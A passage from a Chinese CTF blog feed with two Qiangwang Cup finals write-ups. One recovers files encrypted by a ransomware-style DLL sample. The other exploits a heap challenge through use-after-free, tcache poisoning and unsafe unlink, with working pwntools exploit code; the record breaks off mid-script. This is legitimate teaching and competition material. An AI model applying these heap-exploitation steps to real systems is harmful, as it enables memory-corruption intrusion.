class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接远线程注入这个模块，为了能断下，选择 patch dll 的 dllmain 函数开头为 <code>int 3</code></p><img src="/2024/12/11/qwb2024_final_reverse/15.png" class=""><p>然后，虚拟机里</p><p>x32 起被调试程序，用注入器注入这个 dll。</p><img src="/2024/12/11/qwb2024_final_reverse/16.png" class=""><p>程序成功被断下来</p><img src="/2024/12/11/qwb2024_final_reverse/17.png" class=""><p>这里可以去恢复 int 3 指令然后重新执行一遍。</p><p>如果不改那个标志位，发现 <code>while ( !byte_1000C6DC )</code> 将会是一个死循环，这里估计是要等某个合适的时机，因此找到这个标志位将它赋值为1。</p><img src="/2024/12/11/qwb2024_final_reverse/18.png" class=""><p>跳出循环之后，执行了一个函数</p><img src="/2024/12/11/qwb2024_final_reverse/19.png" class=""><p>看字符串，获取了用户名，又有 Documents 字符串，猜测是对我们用户目录下的文档文件感兴趣，这里可以随意写几个pdf文件让它加密看看它的规律。</p><p>往后跟进几步，发现关键字符串</p><img src="/2024/12/11/qwb2024_final_reverse/20.png" class=""><p>往后跟进之后发现，抛异常了，不过很幸运的是，栈中有数据提示我们</p><img src="/2024/12/11/qwb2024_final_reverse/21.png" class=""><p>文件大小需要时 16 的倍数，那就换一个 16 个 a 的 pdf 文件再来一次。</p><p>随后调试到调用 AES 函数之前，这里需要分析一下这个参数的作用，调用约定属于 thiscall，this 指针存 ECX，其余参数从右往左压入栈中。</p><img src="/2024/12/11/qwb2024_final_reverse/22.png" class=""><p>这里记录一下第三个参数指向的一片内存，这个内存每次运行都不一样，先记录一下。</p><p><code>C3 67 B7 93 5E 0D AB 9A 48 3D BA EB 65 5F B5 92</code></p><p>而第二个参数就是指向了一片 <code>0xBAADF00D</code> 的内存。运行放过去，同时火绒剑也查获了一下这个 dll 的行为。</p><img src="/2024/12/11/qwb2024_final_reverse/23.png" class=""><p>加密文件，删除文件，典型的勒索病毒，同时也注意到多次运行的加密结果是不一样的，而且原本16字节的结果变成了48字节，AES就算是 padding 模式也不会多 32 字节，于是断定它必然是随机加密，而密钥肯定也保存到了文件里，这里 AES 的参数很有可能就是密钥。</p><img src="/2024/12/11/qwb2024_final_reverse/24.png" class=""><p>其实原本这里有点山穷水尽了，后面的结论要得出来对我就比较看运气（高手肉眼就看出来）了。</p><p>偶然的情况下，上面的第二个参数生成了 00 字节，而对应的第二行位置上生成了 0x5A，又联想到之前 lua 脚本写过一段异或 0x5a 的脚本。</p><img src="/2024/12/11/qwb2024_final_reverse/25.png" class=""><p> 相对应地，去源码中找到这一段 <code>system.dll+25C6</code>，在此下断点调试。</p><img src="/2024/12/11/qwb2024_final_reverse/26.png" class=""><p>发现它在异或 0068D14D 的内存，异或了 0x10 个字节，难道说这就是所看到的密钥，验证一遍</p><img src="/2024/12/11/qwb2024_final_reverse/27.png" class=""><p>发现果然就是它会将真实密钥每个字节异或 0x5A 之后保存到倒数第二行，那么最后一行必然不可能是 padding，猜测应该是初始向量，这是一个 CBC 模式的 AES。</p><p>通过研究 lua 脚本还发现，它似乎还对 DLL 进行了 hook，并且使用了 WriteByte 将 <code>system.dll+C6DC</code> 写为了 1，好样的，就是前面死循环的条件 <code>while(!byte_1000C6DC)</code>，在这一刻完成了闭环。这个 dll 不仅用 lua 进行注入，还进行了一定的 hook，直接运行分析样本可能真分析不太出来，其实这里猜也能猜个大概了，但是作者这里觉得还是力求分析完整这个样本。</p><p>首先看看 initterm 函数的函数指针，发现了一些有意思的函数</p><img src="/2024/12/11/qwb2024_final_reverse/28.png" class=""><p>使用 <code>std::_Random_device</code> 获取随机数，随后使用梅森旋转算法计算后续的随机数，这里 <code>0x6C078965</code> 是该算法的一个常数，搜也是能搜出来的。</p><p>而随后将计算出的这么多随机数，使用一定的算法将某 0x10 个字节赋值到了 this 指针，一共调用了两次这个函数，一个在 <code>sub_10001000</code>，另一个在 <code>sub_10001020</code>。赋值的全局变量分别在 <code>1000C6E0</code> 和 <code>1000C6EC</code>，这个是一开始就生成好的。</p><p>自己再去调试一遍也可以验证得到 <code>1000C6E0</code> 指针所指向的值，就是被异或加密前的密钥，或者说就是 pdf 倒数第二行异或 0x5A 的结果，而最后一行的结果与 <code>1000C6EC</code> 指针所指向的内容是一致的。</p><p>因此可以验证一遍：</p><img src="/2024/12/11/qwb2024_final_reverse/29.png" class=""><p>确定没问题之后就可以开始恢复 pdf 文件了，但是因为我的 system.dll 没有做 hook，而 lua 脚本运行的时候做了 hook，因此在题目加密的 pdf 文件中，要先交换高低半个字节，再异或，才是原始密钥。</p><p>先写一下解密 key 的脚本：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[]=<span class="string">&quot;\xcd\x8b\x95\xe3\x1f\x16\xd9\x21\x6b\x3c\x3c\x24\xb2\x6e\x98\xe7&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t=key[i]&amp;<span class="number">0xf</span>;</span><br><span class="line">key[i]&gt;&gt;=<span class="number">4</span>;</span><br><span class="line">key[i]|=t&lt;&lt;<span class="number">4</span>;</span><br><span class="line">key[i]^=<span class="number">0x5A</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>,key[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿得到的结果去解密</p><img src="/2024/12/11/qwb2024_final_reverse/30.png" class=""><p>可以发现已经是一个 pdf 文件头了，下载，打开查看，flag 到手。</p><img src="/2024/12/11/qwb2024_final_reverse/31.png" class=""><hr><p>还有一道 bvp47 也是一道恶意样本分析的题，但是目前精力有限，可能要咕很久才能做出来了233。</p>]]></content>
    
    
    <summary type="html">复盘一下强网决赛的Reverse题</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8决赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/"/>
    
    <category term="Reverse" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8决赛pwn writeup</title>
    <link href="https://xia0ji233.github.io/2024/12/08/qwb2024_final/"/>
    <id>https://xia0ji233.github.io/2024/12/08/qwb2024_final/</id>
    <published>2024-12-07T17:00:00.000Z</published>
    <updated>2025-01-16T12:47:03.578Z</updated>
    
    <content type="html"><![CDATA[<p>同样的，决赛也出了两道pwn题，感觉挺有意思的，来补补wp。</p><span id="more"></span><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p><a href="heap_56fc53234d59e2df8d0d87941a8b8134.zip">附件下载</a></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>这题一开始最大的一个问题可能是题目依赖较多跑不起来，而且只给了 libc 的版本，是 <code>2.31 9.16</code> 版本，这个比较好说。如果是 libcrypto.1.1 这个库不存在也好说，apt 安装就好了。</p><p>照常换了 runpath 和链接器之后报了一个神奇的错误。</p><img src="/2024/12/08/qwb2024_final/1.png" class=""><p>这里的意思就是，虽然你 elf 文件的 libc 换好了，但是 libcrypto.so.1 这个库用的是高版本的 libc，你换了之后 libcrypto.so.1 有些引用了高版本 glibc 的函数就用不了了，所以索性在加载的时候报出错误存在这个问题。</p><p>解决这个问题也很简单，如果不想影响机器的 libcrypto 库那就复制一份出来，将依赖修改到本地的备份版本即可，再用 –replace-needed 参数去替换依赖库。</p><p>例子：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libcrypto.so.1.1 ./libcrypto.so.1.1 ./heap</span><br></pre></td></tr></table></figure><p>此时你还需要将 libcrypto.so.1.1 的依赖库换成对应的版本，才能正常运行。</p><p>最终修改完以来之后，你的两个文件依赖项应该如下所示：</p><img src="/2024/12/08/qwb2024_final/2.png" class=""><p>这样你就能正常运行这个题目了。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目很友好，没有去符号，init_system 里面初始化了 Key，heap_base，和沙箱。</p><img src="/2024/12/08/qwb2024_final/3.png" class=""><p>沙箱就是简单地禁用了 execve 调用，增删改查一应俱全，一步步分析。</p><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><img src="/2024/12/08/qwb2024_final/4.png" class=""><p>下标 0-15还挺大，固定分配 0x30 大小的堆块，读入也是这么长，随后使用 AES 加密保存输入的内容。</p><p>注意到使用了 safe_malloc，而 safe_malloc 检查了 malloc 的返回值，需要与 key 所分配的堆块在同一个页上（即地址除了最低三位十六进制不同，其它必须相同），这样就会导致我们很多漏洞不能利用。</p><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><img src="/2024/12/08/qwb2024_final/5.png" class=""><p>明显是存在 UAF 漏洞的。</p><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><img src="/2024/12/08/qwb2024_final/6.png" class=""><p>同样 AES 加密内容改了上去。</p><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><img src="/2024/12/08/qwb2024_final/7.png" class=""><p>将堆块内容 AES 解密后输出。</p><h4 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h4><img src="/2024/12/08/qwb2024_final/8.png" class=""><p>可以观察到，当 <code>a2 &lt; 16</code> 的时候是不会进行加密的，也就是说输入的明文会直接存储到堆上，解密函数同理。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>UAF是主要的漏洞点，根据UAF可以搞很多事，同时也有许多限制，来列一下目前的限制：</p><ol><li>堆块分配的地址被定死在了堆首的第一个页</li><li>输入的内容超过16字节会被随机Key加密。</li><li>沙箱保护</li></ol><p>对应的解决措施如下：</p><ol><li>堆块指针被限制了那么就可以不用堆块分配指针，而是直接劫持指针，而堆攻击手法里面可以直接劫持指针的方法就是 unsafe unlink了。</li><li>被随机密钥加密首先就想到，可以利用一个 tcache bin attack 劫持 key 所在的堆块，将密钥强制写为 0 字节，这样密钥就等于已知，但是密钥有 16 个长度怎么办呢？刚好 2.31 tcache 取出 free 块的时候会清空 bk 指针，因此写入 8 字节就可以达到清空 Key 的目的。</li><li>沙箱保护 orw 即可绕过。</li></ol><p>理论可行，下面来实践</p><h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>据此构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br></pre></td></tr></table></figure><p>由于 unsafe unlink 的利用手法需要知道堆指针的地址，而题目程序开了 PIE，所以第一步要先想办法泄露程序的基地址。</p><p>注意到解密函数是将内容解密到栈上输出的，因此栈上可能有可以利用的地址。</p><img src="/2024/12/08/qwb2024_final/9.png" class=""><p>0x20 个 a 扔过去发现的确存在一个程序基地址，虽然被覆盖了两个字节，但是依稀可辨。在比赛中我选择了爆破这半个字节，但其实完全没必要，因为可以发现被覆盖的两个字节是由于自己输入了 <code>3\n</code>，而这里的数字输入显然使用 read，那就没必要输入这个回车，可以少覆盖一个字节，这样就完全不用爆破。</p><p>将交互函数的 line 去掉如下所示</p><img src="/2024/12/08/qwb2024_final/10.png" class=""><p>拿到了 code_base 之后，tcache bin attack，这里这样操作：free 两个堆块，再改最后进入的堆块的 fd 指针到 key 堆块的位置。因为 2.31 版本的 tcache 有数量检查，如果检查到数量为0，即使 tcache存的堆块指针不为 0，那也不会被分配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\nP&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1233</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">6</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure><p>成功将 Key 写为 0</p><img src="/2024/12/08/qwb2024_final/11.png" class=""><p>之后尝试泄露一下 heap 的地址，因为需要构造 unsorted bin，需要堆重叠修改 size，因此这里泄露堆地址是比较方便的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">16</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line">heap_addr=u64(res[<span class="number">8</span>:])-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>也很简单，free 一个块让它带地址直接 show 即可，但是会用 Key 解密之后输出，因此我们想要得到原堆块的地址就需要对结果进行加密，密钥已知，也是很容易得出的。</p><img src="/2024/12/08/qwb2024_final/12.png" class=""><p>紧接着再来一个 tcache bin attack，构造堆重叠，修改堆块的大小，free 掉，得到 unsorted bin，泄露得 libc 的地址（同时后面也是知道，我都unsafe unlink了，我还泄露libc地址干嘛呢？？）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,decrypt(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x431</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>)[:<span class="number">48</span>])</span><br><span class="line">add(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x350</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">32</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line"><span class="comment">#print(res.hex())</span></span><br><span class="line">libc_addr=u64(res[<span class="number">8</span>*<span class="number">3</span>:<span class="number">8</span>*<span class="number">4</span>])-<span class="number">0x215be0</span>+<span class="number">0x029000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里我用了 14 这个下标是因为这个地方的指针比较重要（做到后面才发现的）。</p><p>此刻，便是良机，构造 unsafe unlink。</p><h4 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h4><p>讲解一下 unsafe unlink 的原理，glibc 除了 tcache bin 和 fastbin 是单链表管理之外，其余都是双链表管理，单链表管理的堆块普遍不参与相邻内存合并（consolidate）的操作。</p><p>而合并操作需要涉及解链（unlink），为什么需要解链才能合并。因为合并后得到是一个新的大小的堆块，不管是 small bin 还是 largebin，对大小都有严格的限制，所以合并必须 unlink。</p><p>解链我们找找 glibc 中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到解链的一个重要操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>如果对应的堆块本身不处于被释放状态，意味着这个堆块的fd和bk指针我可以任意的修改。而合并是通过什么样的检测去判断呢，它有向前和向后两种合并的方式，从 glibc 源码中也不难看出，当 free 的一个块不在 fastbin 大小的范围内，便会尝试向前和向后合并。</p><p>向后合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向前合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以发现，向后合并（向较小地址）主要依赖于当前释放的这个堆块的 prev_inuse 位，如果为0证明前面（较小地址）的堆块被释放了，就要向后合并，而一旦这个位为0，则检查 prev_size 字段判断堆块的大小。</p><p>同时再来看看如果没有任何检查的 unsafe unlink 会发生什么。</p><p>由于 fd 和 bk 是我任意控制的，因此我可以将 fd+0x18 的地址写上 bk 值，将 bk+0x10 的地址写上 fd 的值。但是很不幸的，它检查了 <code>p-&gt;fd-&gt;bk==p &amp;&amp; p-&gt;bk-&gt;fd==p</code>，满足这些条件才能 unlink，本意很简单，一个正常的双向链表中，任意一个链表中的元素的后一个块的前一个块肯定是自己，反之同理，如果不满足则双向链表肯定发生了问题。</p><p>当然这个 check 可以绕过，首先需要一个指向 chunk 头部的指针，因此这需要我们伪造一个 chunk，而chunk头部的指针当然就是可以用分配得到的用户指针，它存放在程序代码的 bss 段中。</p><p>把 check 的条件化简一下，因为 <code>p-&gt;fd</code> 和 <code>p-&gt;bk</code> 都是任意值，因此不妨将它设为 x 和 y，那么就变成了 <code>x-&gt;bk==p &amp;&amp; y-&gt;fd==p</code>，而 <code>x-&gt;fd</code> 与 <code>y-&gt;bk</code> 转为指针的写法就是 <code>*(void **)(x+0x18)=p&amp;&amp;*(void **)(y+0x10)=p</code>，取第一个等式，对等号两边同时取地址得到 <code>(x+0x10)=&amp;p</code> 那么 <code>x=&amp;p-0x18</code> 同理 <code>y=&amp;p-0x10</code>。那么绕过这个检查的主要就是需要找到一个指向头部的指针。</p><hr><p>在上面的基础，用下面的代码，我们来观察 unsafe unlink 的图解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span 